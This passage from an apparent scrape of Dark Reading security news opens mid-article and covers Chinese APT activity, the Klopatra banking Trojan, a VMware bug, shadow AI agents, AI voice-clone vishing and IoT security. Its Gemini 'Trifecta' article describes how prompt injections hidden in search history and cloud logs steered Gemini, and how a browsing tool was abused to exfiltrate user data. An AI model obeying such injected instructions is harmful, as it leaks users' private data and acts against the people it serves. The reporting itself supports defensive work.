or loss of business. Attacks on information or news sites that show non-state-approved content for more than six hours, gets more than 1 million views or clicks, or are forwarded more than 100,000 times through social media can be recognized as widespread attacks and thus more severe, the notice stated.Related:Czech Warning Highlights China Stealing User DataAttacks on critical networks have surged in recent days, especially from China-linked groups, with CrowdStrike's ""2025 Global Threat Report"" highlighting a 150% increase in China-linked activity. In addition, supply chain attacks have tripled in Europe, forcing governments to call on private industry to more quickly detect and respond to attacks, says Kellermann.In Europe and the US, 72-hour notice requirements are common, he says.""Due to this stark reality, I do think 72 hours is reasonable, but the cybersecurity maturity of organizations varies,"" he says. ""Given the speed of lateral movement and island hopping, I do believe 72-hours should become the norm.""Different Approaches to ResponseRelated:Japan, South Korea Take Aim at North Korean IT Worker ScamDoes China's shorter time requirements make its networks more secure? Not necessarily, says Trey Ford, chief strategy and trust officer at Bugcrowd, a crowdsourced cybersecurity firm. The differences highlights how much governments in different countries take part in subsequent investigations, he says. Early reporting prioritizes speed over thoroughness in the investigation, which can work only if the government is actively helping in the investigation, he argues.""In the Western business paradigm, governments will be notified to drive accountability and transparency in the private sector,"" Ford says. ""The Western timelines provide a level of time and latitude for internal investigation, activation of legal and expert forensic guidance in response — where I'd expect the government in the two- or four-hour timeline to get involved and help work the response.""For Western countries, that means the Chinese model likely will not work well, especially for private industry, says Ford. Forcing companies to report breaches too quickly can result in critical mistakes, he says.""Excessively urgent initial reporting is a bad idea,"" he says. ""It is wasteful and applies tension to an already stressful and complex operational environment in the private sector."""

A previously undocumented Chinese nation-state actor has been targeting government agencies, embassies, military operations, and other entities across Africa, the Middle East, and Asia in a cyber-espionage operation as sophisticated as it is stealthy and persistent.What makes the campaign different from other China-nexus activity is the threat actor's strategy of going directly after high-value systems at organizations of interest instead of the usual social engineering of end users.Surgical Precision""Phantom Taurus sets itself apart from other Chinese APTs through a combination of its surgical precision, unprecedented persistence, and its use of a highly sophisticated, custom-built toolkit,"" says Assaf Dahan, director, threat research, at Palo Alto Network's Unit 42 group. Unlike many Chinese threat actors who rely on broad phishing campaigns, Phantom Taurus's playbook is far more surgical, says Dahan, whose team has been tracking the activity since June 2023.Phantom Taurus actors often bypass users entirely by meticulously researching and then directly targeting critical infrastructure, such as vulnerable web and email servers, he says. ""This focused approach allows them to pinpoint the exact systems and individuals that will grant them access to their desired information.""Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteAmplifying the threat is Phantom Taurus's persistence. Unlike most APTs that go dark for weeks or months after discovery to retool, Phantom Taurus resurfaces within hours or days, Dahan says. ""This willingness to risk re-exposure underscores the critical nature of their missions and their determination to maintain access at all costs.""Unit 42 originally tracked the threat actor as CL-STA-0043 and later as TGR-STA-0043, aka ""Operation Diplomatic Specter."" The security vendor recently decided to formally designate the group as a new China-linked APT after analyzing threat activity over the past year.In a nutshell, Phantom Taurus's mission appears to be to collect sensitive and non-public information of economic and geopolitical interest to the Chinese government. This has included diplomatic communication, military intelligence, and other government information particularly around major regional and global events.Initially, the threat actor gathered this information by infiltrating email servers and stealing messages from victim organizations. More recently, Phantom Taurus has begun also going directly after databases containing the data they seek. Since early this year, the threat actor has been using the script ""mssq.bat"" to connect to SQL Server databases using previously obtained systems admin credentials. The group has then been using custom SQL queries to search for specific tables and keywords on the compromised system, exporting all matching results and then closing the connection.Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageNew .NET Malware SuiteIn addition, Unit 42 discovered Phantom Taurus using a new .NET malware suite it is tracking as NET-STAR to breach Internet Information Services (IIS) Web servers. The malware operates almost entirely in memory and consists of a fileless backdoor that establishes encrypted command-and-control (C2) sessions. The backdoor (IIServerCore) accepts commands and encoded .NET payloads and can execute different tasks, including arbitrary code execution on compromised systems. To evade easy detection, the threat actor alters filesystem timestamps so they match timestamps of other files on the system.Unit 42 researchers also found NET-STAR includes two AssemblyExecuter loaders (v1 and an enhanced v2) that allow Phantom Taurus actors to dynamically load additional .NET malware. The newer v2 version, according to Unit 42, adds advanced evasion techniques such as Antimalware Scan Interface (AMSI) bypass and Event Tracing for Windows (ETW) bypass.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) Business""This toolkit demonstrates a deep understanding of Windows environments and includes advanced components like IIServerCore, a fileless backdoor that executes in memory to evade detection,"" Dahan says. ""AssemblyExecuter V2, [is] a payload with built-in capabilities to bypass modern security tools like the AMSI and ETW, effectively blinding an organization's defenses.""Phantom Taurus's operational methods are supported by other custom malware, as well. ""For email exfiltration, they deploy a previously undocumented family of backdoors named TunnelSpecter and SweetSpecter to compromise mail servers and steal entire mailboxes based on keyword searches related to topics like OPEC, military intelligence, and international relations,"" Dahan says.Interestingly, while Phantom Taurus employs tactics and techniques that are different from other China-aligned advanced persistent threats, a lot of its attack infrastructure is not. Unit 42 found the threat actor using servers and other infrastructure that had clear overlaps with other known Chinese APT groups, such as Iron Taurus (aka APT27), Starchy Taurus (aka Winnti) and Stately Taurus (aka Mustang Panda), Dahan says.The C2 that Phantom Taurus is using has the same IP addresses as those used by other threat groups, many of the malicious domains in its campaign have the same registration information and the same hosting providers, he adds."

An evasive new Android Trojan in the wild is capable of covertly stealing victims' money while they're sleeping.Often, malware has to evolve and present new challenges to cyber defenders in order to survive. But banking Trojans have always been the meat and potatoes of cybercrime — effective, despite being mostly unchanged for decades now.""Klopatra,"" a new banking Trojan described in a recent blog post from fraud detection vendor Cleafy, isn't a total overhaul of the familiar model. It's devilishly effective, though, with a solution for every security or access barrier that might get in the way of draining a victim's bank account, and protections that make sure the victim is never alerted in the meantime. The initial builds of Klopatra were first observed in March, and the Trojan came into its own in the summer and now has infected more than 3,000 devices in Italy and Spain.The Perfect LureIn Europe, just as it is in the United States, streaming live sports has become a bit of a nightmare. Leagues often split broadcasting rights between multiple providers, requiring fans to subscribe to handfuls of monthly services just to watch their favorite teams play on a regular basis. Then there are blackouts to account for, technical issues, and other obstacles.Related:'Confucius' Cyberspy Evolves From Stealers to Backdoors in PakistanIt's why tens of millions of fans once turned to ""Mobdro,"" the world's most popular pirate streaming service.

It's a clever disguise, as Mobdro carries demand and brand recognition. More than that, though, its illegality provides a perfect excuse for the attackers to ask users to download it outside of the bounds of the Google Play store.In general, users of illegal streaming services may also be more inclined to stretch the bounds of what their devices are designed to do. That, too, works in Klopatra's favor, as once the program installs on an Android device, it requests permission to utilize Accessibility Services. Users who grant this permission allow the malware any powers an attacker could wish for over a mobile device.Just to be sure, though, the malware employs a number of techniques designed to obfuscate its true nature and put off analysis tools. It makes use of a variety of anti-sandboxing techniques and native libraries that are difficult to read because they run outside of Android's usual managed runtime environment. It also uses a commercial Chinese packer called ""Virbox"" to compress, encrypt, obfuscate, and virtualize its malicious code, frustrating analysis efforts.Related:Google Sheds Light on ShinyHunters' Salesforce TacticsTrojan in the NightKlopatra is ultimately a remote access Trojan (RAT) with some typical information-gathering capabilities: capturing screenshots and screen recordings, collecting a list of installed apps, and even displaying fake notifications. Like other banking Trojans, it can overlay a variety of pre-rendered login screens atop legitimate apps so as to steal credentials from users while they think they're logging into the real thing. This is all preliminary, however, to the real meat of the attack.Klopatra is most effective when it allows an attacker to interact with a victim's device as if they were holding it in their hands. They can simulate taps of the finger, swipes, and long presses from abroad, Cleafy's report noted. In effect, they can do just about anything: lock and unlock the screen, enter the PIN or password pattern necessary to unlock the device, open and engage with apps, type in text or copy it from the clipboard. They could probably use Klopatra to text a victim's mother, if they wanted to.Related:Chinese APT Leans on Researcher PoCs to Spy on Other CountriesA victim might get suspicious, though, if they watched a ghost in their phone text their mom. And indeed, as Cleafy researchers tracked Klopatra attacks, they realized that the hackers were accounting for that, specifically carrying out their remote manipulations during the nighttime hours in Europe. Here's how it would typically go:First, the malware performs a check to see that the screen is off and the user inactive. It further checks that the device is plugged in and charging, indicating that the victim might be charging overnight, and unlikely to open their device in the coming hours.Next, the attacker activates the device but turns the screen brightness down to zero, such that it will outwardly appear to still be off. They use the PIN or password pattern they've previously stolen to unlock it, then they open a targeted banking app and enter previously stolen credentials. Finally, they drain the victim's bank account in a series of transfers sent to their own account. The victim will wake up in the morning none the wiser, until they realize what happened to their savings.Kern Smith, vice president of global solutions at Zimperium, claims that banking malware like Klopatra are still growing and evolving, despite being around so long. ""Today's banking malware doesn't just steal passwords, it conducts real-time fraud, blending overlays, remote control, and social engineering into one seamless attack,"" he says, so ""organizations need tools purpose-built for mobile that can adapt as quickly as attackers evolve."""

A newly disclosed VMware vulnerability has potentially been exploited by threat actors for nearly a year.VMware owner Broadcom on Sept. 29 disclosed three vulnerabilities: VMware Aria Operations and VMware Tools privilege escalation flaw (CVE-2025-41244), VMware Aria Operations information disclosure bug (CVE-2025-41245), and VMware Tools for Windows improper authorization vulnerability (CVE-2025-41246).Patches for all three are available now and customers should update affected products to the latest version, per Broadcom's advisory. CVE-2025-41244 may be the most notable, however, based on a blog post published by penetration testing and incident response firm NVISO. In the post, Maxime Thiebaut, an analyst with the firm that discovered the vulnerability, claimed it has observed zero-day exploitation in the wild beginning in mid-October of last year.Additionally, Thiebaut said NVISO determined in incident response engagements that Chinese state-sponsored threat actor UNC5174 triggered the relevant local privilege escalation during attacks.But perhaps most interesting about the vulnerability, the blog post described execution of CVE-2025-41244 as ""trivial,"" such that there's a ""real possibility that several other malware strains have accidentally been benefiting from unintended privilege escalations for years.""Related:How Maclaren Racing Gets From the Browser to the TrackInside VMware Bug CVE-2025-41244CVE-2025-41244 is a privilege escalation bug that impacts VMware Tools, a suite of utilities that helps a virtual machine guest's operating system function properly, as well as virtual appliance VMware Aria Operations.According to NVISO, which analyzed Tools using an open source version called ""open-vm-tools,"" Tools has a service discovery feature that has multiple functions, including finding the version of a connected component. And in the process of discovering binaries, users are provided with elevated privileges. An attacker can use this capability to search for and discover non-system binaries, including malicious ones, with the privilege escalation component staging the malware on the threat actor's behalf.""As simple as it sounds, you name it, VMware elevates it,"" Thiebaut wrote.Service discovery, whether conducted through living-off-the-land techniques or installing malware post-access, is well-established threat actor behavior. It is in part because of this that Thiebaut said he's unsure whether UNC5174 willfully achieved exploitation.""The broad practice of mimicking system binaries (e.g., httpd) highlight the real possibility that several other malware strains have accidentally been benefiting from unintended privilege escalations for years,"" the blog post read. ""Furthermore, the ease with which these vulnerabilities could be identified in the open-vm-tools source code make it unlikely that knowledge of the privilege escalations did not predate NVISO's in-the-wild identification.""Related:Threat Actors Increasingly Leaning on GenAI ToolsAccording to the timeline, NVISO identified the vulnerability in mid-May during a UNC5174 incident response engagement. After identifying CVE-2025-41244 as a zero-day and reporting it to Broadcom, the two companies agreed to an embargo as part of responsible disclosure, then posted the blog and advisory yesterday.Dark Reading asked NVISO about the timeline and how the firm detected exploitation back in October. In response, a spokesperson says it came down to earlier evidence of exploitation.""The gap relates to 'dwell time' — the period between when an attack took place and its discovery. NVISO was called for incident response earlier this year, when the attack was detected,"" the spokesperson explains. ""During forensic analysis, we reconstructed the timeline and found the traces of this exploitation dating back to October 2024. We reported the vulnerability to Broadcom within days of confirming it.""Related:North Korea's IT Worker Rampage Continues Amid DoJ ActionBroadcom did not mention ongoing or previous exploitation activity in the advisory. Dark Reading asked the vendor why, but Broadcom has not responded by press time.Discovering and Mitigating CVE-2025-41244On one positive note, CVE-2025-41244 exploitation can be ""easily detected,"" Thiebaut said, through monitoring for the right suspicious processes as detailed in the blog post. ""Being a local privilege escalation, abuse of CVE-2025-41244 is indicative that an adversary has already gained access to the affected device and that several other detection mechanisms should have triggered.""In its advisory, Broadcom said the vulnerability, which has a ""high"" CVSS severity rating of 7.8, can be remediated only by applying the appropriate patch, depending on which VMware product the customer is running. No other workarounds or mitigations are available."
2025-10-06 12:51:39,"September 30, 2025",Dark Reading,https://www.darkreading.com,https://www.darkreading.com/cyber-risk/can-shadow-ai-risks-be-stopped,Can Shadow AI Risks Be Stopped?,"Agentic AI has introduced abundant shadow artificial intelligence (AI) risks. Cybersecurity startup Entro Security extends its platform to help enterprises combat the growing issue.
Enterprises grant nonhuman identities (NHI) with highly sensitive access, but monitoring and managing those privileges can prove challenging. Concerns will only grow as the NHI landscape continues its rapid expansion, particularly due to the influx of artificial intelligence (AI) agents.Digital identities are nothing new. Organizations use NHIs like API keys, service accounts, and machine identities to autonomously secure applications and devices — no human necessary. But the proliferation of AI agents has put the spotlight back on existing security gaps while also introducing new issues. NHIs represent a large chunk of organizations' attack surfaces but create blind spots for security teams with threats like shadow AI and, maybe more concerningly, unsanctioned digital assistants known as shadow agents.The explosion of AI agents and other NHIs has led to increased risks for enterprises, says Itzik Alvas, co-founder and CEO of Entro Security, which offers an AI agent and NHI security platform. Those risks include unowned and overprivileged AI agents, as well as shadow access paths to sensitive data.Entro Security has expanded its platform to include an AI agents discovery and observability tool to stop shadow agents.Map, Monitor, and ManageRelated:SecurityScorecard Buys AI Automation Capabilities, Boosts Vendor Risk ManagementAlvas founded Entro in 2022 with a focus on NHI protection. Securing AI agents has been within the purview for the past six months, but Etro faced challenges to develop the platform extension, which was officially announced today. It needed to build an observability layer that works agentlessly across code, cloud, endpoints, and software-as-a-service, Alvas explains. It also had to accurately map AI agents to human owners and risks, even in highly distributed environments.      Now that it has worked through the obstacles, the agentic AI security tool looks to help organizations by mapping out a complete view of all agents, NHIs, and secrets across their stacks. It also looks to improve ownership and life cycle management, agent and NHI posture, and threat detection. The tool analyzes AI agents' purpose, permissions, and blast radius and monitors agents and their NHIs' behavior.Are Shadow AI Risks Burgeoning?Recent internal Entro Security research found that over 90% of NHIs operate without proper life cycle management, which makes the vector a prime target for attackers, Alvas explains. Shadow AI is one of the more prominent risks emerging across the NHI landscape.And risk is escalating fast. With AI adoption surging, developers are spinning up shadow AI agents using large language model (LLM) APIs, such as OpenAI and Anthropic, without oversight, Alvas says.Related:F5 to Acquire CalypsoAI for Advanced AI Security Capabilities""These agents often hold powerful credentials but lack ownership, governance, or revocation paths, exposing enterprises to data leaks, security risks, and compliance gaps,"" he says.Shadow AI concerns are mounting for enterprises, agrees Jeff Pollard, vice president and principal analyst at Forrester, pointing to both individuals using AI applications and technical users making AI applications with the tools. It should be expected that enterprise teams and users will experiment before controls are in place, he says.""We know that because that's how it has always worked with every emerging technology,"" Pollard explains. ""AI is no different. Security teams need to allow access to AI because employees will find ways to use it.""'Continuous Risk Management, Mutual Authentication'Shadow AI is just one risk as agentic AI snowballs, creating new NHI identity security challenges. Agents function as autonomous actors that must authenticate and authorize like users. But they do it as machine speed and scale, Pollard says. That pace is difficult for any security team to monitor.  Forrester's Agentic AI Enterprise Guardrails For Information Security (AEGIS) framework recommends using new principles, such as least agency, continuous risk management, and mutual authentication between agents and tools. The AEGIS report breaks down agentic AI security recommendations into six domains where enterprises struggle: governance, risk and compliance, identity and access management, AppSec, threat, and zero trust.Related:Anyone Using Agentic AI Needs to Understand Toxic Flows""Launch a rolling agent discovery program and maintain a living inventory that tracks purpose, tools, scopes, owners, and data access,"" Pollard recommends. ""[And] require mutual authentication and encryption for all agent communications regardless of network location.""However, there is one important caveat, Pollard says.""Agent identities are not human identities, and they are not machine identities,"" he says. ""They are something different and should be treated as such. Anyone that says, 'agents are just people' or 'agents are just machine identities' is trying to sell something."""
2025-10-06 12:52:24,"September 30, 2025",Dark Reading,https://www.darkreading.com,https://www.darkreading.com/vulnerabilities-threats/trifecta-google-gemini-flaws-ai-attack-vehicle,'Trifecta' of Google Gemini Flaws Turn AI Into Attack Vehicle,"Flaws in individual models of Google's AI suite created significant security and privacy risks for users, demonstrating the need for heightened defenses.
Three flaws within separate models of Google's Gemini AI assistant suite exposed them to various injection attacks and data exfiltration, respectively, creating severe privacy risks for users, researchers have found. The flaws serve as a reminder that these models are not only targets for attackers, but also can be weaponized against users and thus require strict security parameters.Researchers at Tenable discovered the flaws, which they dubbed the ""Gemini Trifecta,"" in several products within Google's family of AI models — specifically Gemini Search Personalization, Gemini Cloud Assist, and the Gemini Browsing Tool, they revealed in a report published today.The vulnerability in Search Personalization made the model vulnerable to search-injection attacks, while the flaw in Cloud Assist allowed low-to-prompt injection attacks. The Browsing Tool had a flaw that allowed attackers to exfiltrate the user's saved information and location data, according to the report. All the flaws were reported to Google, which has since remediated them with fixes specific to their nature""AI assistants like Google’s Gemini have become integral to how users interact with information,"" Liv Matan, senior security researcher at Tenable, wrote in the report. ""However, as the capabilities of these tools expand, so do the risks associated with vulnerabilities in the underlying systems.""Related:Iranian State Hackers Use SSL.com Certificates to Sign MalwareFinding Holes in Gemini AI DefensesGoogle has made considerable efforts to harden Gemini AI assistant against exfiltration, sandboxing Gemini's responses to prevent data leaks, Matan acknowledged in the report.Knowing this and also knowing that Gemini has proved vulnerable in the past, Tenable researchers set out to try to infiltrate a prompt to ""trigger a tool-based exfiltration to an attacker-controlled server even with Google's existing defenses in place,"" Matan wrote. In doing so, the researchers found flaws that enabled data exfiltration and attacks in several models.One flaw, a search-injection vulnerability in Search Personalization, gave attackers the ability to inject prompts, control Gemini's behavior, and potentially leak the user's saved information and location data by manipulating their Chrome search history.The flaw existed because the model contextualizes responses based on user search history, which means that ""search queries are, effectively, data that Gemini processes,"" Matan wrote. This makes search history not merely passive context, but also active input, he said.The researchers created an attack in which prompts could be inserted into this context via injected search queries using JavaScript from a malicious website. ""If a victim visited the attacker’s website, the JavaScript would inject the malicious search queries into the victim’s browsing history,"" Matan wrote.Related:Cisco's Wave of Actively Exploited Zero-Day Bugs Targets Firewalls, IOSWhen the user then interacted with the model, it would process the user's search queries — including these malicious search queries injected by the attacker, which are essentially prompt injections to Gemini, he said.The researchers discovered another prompt injection flaw in Cloud Assist, which is designed to help users make sense of complex logs in Google Cloud Platform (GCP) by summarizing entries and surfacing recommendations.While evaluating this feature, the researchers noticed that Gemini wasn't just summarizing metadata, but also was pulling data directly from raw logs. This led them to create an attack that tricked Gemini into executing instructions via prompt injections hidden in log content.In this way, the model could be manipulated to potentially compromise cloud resources, as well as allow attackers to conduct phishing attacks, Matan said. ""This vulnerability represents a new attack class in the cloud and in general, where log injections can poison AI inputs with arbitrary prompt injections,"" he noted.Related:Salesforce AI Agents Forced to Leak Sensitive DataExfiltration Through AI-Assisted BrowsingFinally, a flaw in the Gemini Browsing Tool, which allows the model to access live web content and generate summaries, gave attackers a way to exfiltrate a user's saved information and location data by abusing the browsing tool, potentially putting user privacy at risk.The researchers created a prompt engineering attack that opened a side-channel exfiltration vector by exploiting the tool's ""Show thinking"" feature, which shows how Gemini reacts to and processes a prompt, what actions it takes, and more.""This feature leaked the internal call Gemini makes when browsing, allowing us to use Gemini's language to invoke the tool instantly and make it cooperate,"" Matan explained.Google's Mitigations for Gemini AI FlawsTenable reported all the flaws to Google, which made changes specific to each one. To mitigate the Search Personalization flaw, Google rolled back the vulnerable model, continues to harden the search personalization features, and uses a layered prompt injection defense strategy to strengthen its products against this type of attack, according to Tenable.Meanwhile, the GCP product team made a change to Cloud Assist to stop rendering hyperlinks in the responses for all log summarization responses. For example, ""see this link"" is now rendered as ""see this [link](http://google.com).""Finally, Google mitigated the Browsing Tool flaw by preventing data exfiltration from browsing in indirect prompt injections, according to Tenable.How to Prevent AI from AttackingThough the Gemini Trifecta flaws have been mitigated, their existence and that of similar vulnerabilities in Gemini and other AI tools highlights a critical concern for enterprises, as attackers seek to manipulate these tools and the sensitive info saved within them ""to harvest credentials, escalate privileges, and exfiltrate data,"" Matan tells Dark Reading via email.""Attackers also can find ways to exploit connected services to move laterally into other attack surfaces that potentially house more sensitive data,"" he warns.As AI assistants like Google’s Gemini become integral to how users interact with information, ""defenders must treat AI integrations as active attack surfaces rather than passive tools,"" and put security parameters in place to protect their users, Matan says.This can be done in a number of ways, such as ""gaining visibility into all AI tools, authorized and unauthorized, regularly auditing logs and search histories for manipulation (specifically prompt injection attempts), as well as monitoring for unusual outbound requests that may indicate data exfiltration,"" he says.It's also crucial for organizations to test AI services for resilience against prompt injection and implement layered defenses, including input sanitization and strict monitoring of tool executions, Matan adds."

As vishing becomes more frequently used amongst threat actors, researchers have discovered that AI-generated voice clones from as little as five minutes of recorded audio are well on the rise.NCC Group's research team has explored how voice impersonation using AI allows for classic social engineering attacks to become even more refined, blurring the lines of what is real and what is simulated. This could put enterprises, their employees, and everyday individuals at increased risk of voice phishing or vishing attacks from bad actors trying to gain access to their personal information, financial accounts, sensitive corporate data, and more. NCC Group's report includes a clip of a voice clone that researchers recorded in real-time, though the company declined to publish the technical details of their exploits to prevent attackers from making similar voice clones. ""That said, it should be expected some threat actors have already developed these techniques themselves,"" NCC Group's Pablo Alobera, managing security consultant; Víctor Lasa, security consultant; and Mark Frost, principal security consultant, wrote in the report. Vishing attacks involve a threat actor using voice calls instead of emails or text messages to trick their target into giving up personal information. This could include a voicemail from a supposed family member asking for an account number, or IT personnel at a company asking for an employee's credentials or remote access to their device. Related:Scattered Lapsus$ Hunters Returns With Salesforce Leak SiteSeveral of these attacks have already occurred this year alone. In August, Cisco disclosed that it suffered a data breach at the hands of a bad actor who targeted a Cisco representative in a vishing attack, allowing them to access and export information.In June, a financially motivated threat group impersonated IT support staff in phone calls with Salesforce customer employees, prompting the latter to provide their access to the Salesforce environments.And in May, 3AM ransomware group adopted the trend of combining email bombing with vishing to gain access to victims' systems before deploying their ransomware.Vishing Attacks: What Changed?Previously, there were several limitations for AI-powered or deepfake vishing attacks, according to the NCC Group researchers. ""The vast majority of the state-of-the-art deepfake technologies and architectures were focused on offline inferences,"" the researchers wrote. ""These were capable of achieving good results when cloning a pre-recorded extract of someone talking, but they couldn't change a user's voice in real-time — a key requirement for vishing attacks. In addition to this, many of them were strongly dependent on TTS [text-to-speech] models.""Related:Dutch Authorities Arrest Two Teens for Alleged Pro-Russian EspionageEither the reliance on TTS models would create an unnatural delay in the cloned responses to a victim or the attacker could use a set of pre-recorded sentences, which would be unaligned with real-time conversations. While vishing attacks have been successful, there are restrictions that have prevented AI technology from conducting an entirely realistic attack.""The main objective of our research was therefore to try to overcome these limitations by developing a framework capable of real-time voice cloning,"" wrote the researchers. ""A framework which took the words spoken by the consultant in their own natural voice as input, so that those words could then be delivered in the desired voice, in a way that would not raise suspicion with the victim.""The research team was able to train a model in just a few hours, using a few minutes of publicly available voice samples of the targeted individual. They were then able to clone the voice and make calls using real-time voice processing.“This was all possible using hardware, audio sources and audio processing software that were all 'good enough', rather than being exceptional,"" wrote the researchers, meaning that even someone with an average understanding of the technology and some financial resources would be able to create a similar framework and execute it during vishing attacks.Related:Jaguar Land Rover Shows Cyberattacks Mean (Bad) BusinessReal-Time Voice Cloning Meets Real-Life ConsequencesThe researchers noted that they have successfully run practical versions of the vishing attacks against real organizations. In these attacks, they were able to obtain confidential information and demonstrate how these attacks can convince people in positions of key operational responsibility to perform actions on behalf of attackers.Moving forward, while attackers are still focused primarily on traditional vishing, AI vishing will be harder to detect, better at impersonation, and highly convincing, according to the researchers.""We anticipate a rise in both broad campaigns leveraging well-known personas and highly targeted attacks aimed at specific organizations,"" the researchers tell Dark Reading via email. ""For amateur threat actors, just like with any major technological shift, it's likely we'll see new players emerge, drawn by the accessibility and potential financial gain and general impact of these tools.""That means that enterprises must remain cautious of attacks involving executive impersonation, as well as the potential risks of relying on voice authentication for system or account access. And individuals must remain wary as well, as they could fall victim to credential theft, harassment or coercion, social trust erosion, and other scams, according to the researchers.""Any process in which a person can make an exception is vulnerable to social engineering, whether it is traditional vishing, AI voice cloning, phishing or deepfakes,"" they add. ""To combat the threat of AI vishing, organizations should implement multi-factor authentication, train staff to verify unusual requests, even if the voice sounds familiar, use code words or secondary verification methods outside of multi-factor authentication for sensitive transactions, and monitor and limit public voice exposure, especially for executives or public-facing employees."""

The use of Internet of Things (IoT) devices is exploding, but cybersecurity considerations on the part of device makers continue to lag, leaving enterprises vulnerable to distributed denial-of-serviceand other attacks that can lead to data theft. New initiatives are underway to curb the issues, but progress remains slow.In this edition of what will become a regular ""Reporters' Notebook"" video series, two intrepid cybersecurity journalists, Dark Reading's Arielle Waldman and Cybersecurity Dive's Eric Geller, break down their recent findings around IoT security woes and emerging government-backed safety efforts for connected devices. IoT devices, such as sensors, appliances, and smartwatches, are insecure from the start because they aren't set up to receive vulnerability patches and other vital updates. But the security shortcomings are even more concerning now, considering how ubiquitous IoT has become, for everything from smart office lighting to advanced medical devices to connected tractors in the agriculture space. And IoT devices are also designed to be controlled remotely, so attackers are becoming more adept at hacking them to achieve distant control.Fortunately, stakeholders are focused on legislation, policies, and grassroots efforts to support IoT security. The US Cyber Trust Mark, a voluntary labeling program for IoT device-makers is one prime example, but it's unclear when, or whether, the program will be officially enacted due to concerns around its lead administrator's ties to China. If given the green light, it would promote increased transparency around IoT security controls. For now, there are voluntary recommendations for enterprises as they wait for security to catch up to IoT's widespread use.Related:System Shocks? EV Smart Charging Tech Poses Cyber-RisksArielle Waldman & Eric Geller: Full Video TranscriptThis transcript has been edited for clarity.Dark Reading's Arielle Waldman: Hi, I'm Arielle Waldman, a features writer with Dark Reading, and here I have Eric Geller. Do you want to introduce yourself?Cybersecurity Dive's Eric Geller: Hi, I'm a senior reporter at Cybersecurity Dive.DR's Arielle Waldman: Today we are talking about IoT security. We can start with some problems with IoT security that enterprises are facing. IoT devices are inherently insecure. They do not receive vulnerability patches and other updates. They also are built for long lasting life cycles which are difficult to manage, and there are a lot out there that are legacy — and that causes a lot of issues for enterprises as well.Attackers are also becoming more competent at hacking into IoT devices, and they're not just deploying botnets anymore. They're using them to get into routers and gain entry to enterprises, which is becoming more alarming, and a bigger concern for everyone.On the flip side, there're also manufacturing issues. A lot of manufacturers ship them with default passwords, and users don't know to change those passwords to more secure options, which is a big issue as well.Like a lot of things in cybersecurity, it's difficult to balance security with usability, and that's always an issue. They want to try to reduce user friction, but at the same time, that means sometimes security is lacking. Have you observed that as well, Eric?CD's Eric Gellar: Absolutely. That's the big trade-off. These companies want their products to be engaging and accessible, but at the same time that often leads to a reduction in that focus on security as they don't want to be an impediment to the use of their product.DR's Arielle Waldman: I think there's just more and more IoT manufacturers and suppliers emerging on the market today, and they may not always be learning from past mistakes and to build security from the beginning. That's always important, but it's often not happening, especially with IoT manufacturers.CD's Eric Gellar: It is easier to do secure by design, but it's also expensive, and it's expensive to fix problems after the issue as well, so that causes problems.Effective practices are a big issue and it's especially concerning for medical tech. A lot of medical IoT devices may not come with passwords on them to make it easier for the user, but at the same time that just makes it so vulnerable, and attackers can take advantage of that.DR's Arielle Waldman: Have you noticed any legislation or new policies that are coming out to help with IoT security?CD's Eric Gellar: Yes. At the end of the last administration, the FCC kicked off a program called the US Cyber Trust Mark, which is going to let companies submit their products for testing by government-approved labs. And if the tests pass, the company can put a label on their product that essentially says this is US government-approved. It follows certain practices like having an end-of-life policy, like having guaranteed updates for a certain number of years.You can basically, as a consumer, go into a store or go on Amazon and see which products have this seal of approval on them, and you can scan a QR code on the box for information about, say, how long will I be getting software updates, what is the manufacturer's process for applying patches, things like that. The goal is to create something like the Energy Star program for home appliances, which tells consumers that this product meets certain government-set criteria for energy efficiency.We're going to build something similar for cyber. It hasn't gotten off the ground yet because the new administration has started an investigation of the company that was put in charge of the program [lead administrator UL Solutions]. Until that investigation concludes, and until we find out what happens with that company that's been put in charge, we don't know when the program is going to kick off. If it will even be this year, if it will even be in the next few years, it's really unclear because we don't know what this investigation's going to find. But the investigation is about alleged connections between the company that was put in charge and the Chinese government.The FCC is very concerned about companies with ties to China doing this work of auditing and inspecting telecommunications equipment, which includes IoT, because if it has a radio antenna in it for wireless communication, it's within the FCC's purview.This program was considered the best effort to put a US government seal of approval on secure IoT products and encourage companies to want to build secure IoT products in the first place.DR's Arielle Waldman: That's really important. As we were saying, the manufacturers don't always put security first, and they really need an outside pressure or force maybe to incentivize that and force everyone to be on the same page. Everyone's on a different page right now it seems, and if competitors are not following secure protocols, then most likely the other manufacturers won't as well.Are the Chinese issues related to SoHo [small office/home office] routers as well, and how Chinese nation-state attackers [Volt Typhoon] were found in the SoHo routers and things like that, the IoT devices. Maybe that's a concern from a Chinese standpoint?CD's Eric Geller: I think that the government is really concerned about this company having to turn over information to China because it has a presence in China. And if the company has information about what products are safe and what products are not safe, and if it's required to give information to China, that could mean that China's getting its hands on information about these products that are going through.Now that's just speculation at this point, but that's the kind of thing that the government is worried about.DR's Arielle Waldman: How likely do you think this is to pass? You said it's been a while. The investigation will take a long time, and I'm sure widespread adoption of this will take even longer. It seems like security is just a bit slow. The progress is a bit slow.CD's Eric Geller: Yes. Once the investigation is over, we could see the next steps move quickly if the FCC decides that it's comfortable with this company still being in charge. But the good thing is it doesn't have to go through Congress or anything like that because it's just a program that the FCC set up on its own authority. But they still have a bunch of steps to complete. They've got to approve the draft testing standards that lay out the expectations for the testing process — a lot of little minor bureaucratic things like that. And then potentially if the investigation decides, OK, we're comfortable with this company being in charge, we could see the program get off the ground within a year.This is the big stumbling block right now. There are other things to be done, but they're not as ambitious or problematic from a logistical standpoint. They're minor paperwork things at this point.DR's Arielle Waldman: That's good. Are there any other legislation or policies that the US has been pushing or the UK?CD's Eric Geller: Well, right now in Europe, we're getting ready for the launch of the Cyber Resilience Act, which sets requirements for companies that make all kinds of connected products, and cybersecurity is part of that. IoT devices are going to be covered by that. And what we should expect to see in the coming years is companies that sell products in Europe meeting those requirements and going back to the US and selling the same products that are just as secure. Depending on whether or not this FCC program gets off the ground, they may or may not even be able to say to the world or to US consumers, ""Hey, our products are safe. You should use them."" If this FCC program is launched, they'll be able to put a nice clean little label on their product and that will tell businesses and consumers who are buying these products, ""I should buy from this company.""If the program hasn't launched yet, they can't put that label on there and then they don't have anything to differentiate themselves in the market from companies that are not trying to meet these standards. Look for over the coming years, manufacturers wanting to show that they're doing the right thing, both in Europe where they already have to do that, and in the US where it's voluntary.DR's Arielle Waldman: Is there anything companies can do now, while we're waiting for these new regulations to take effect?CD's Eric Geller: They could certainly look at the draft testing standards and figure out if they would be 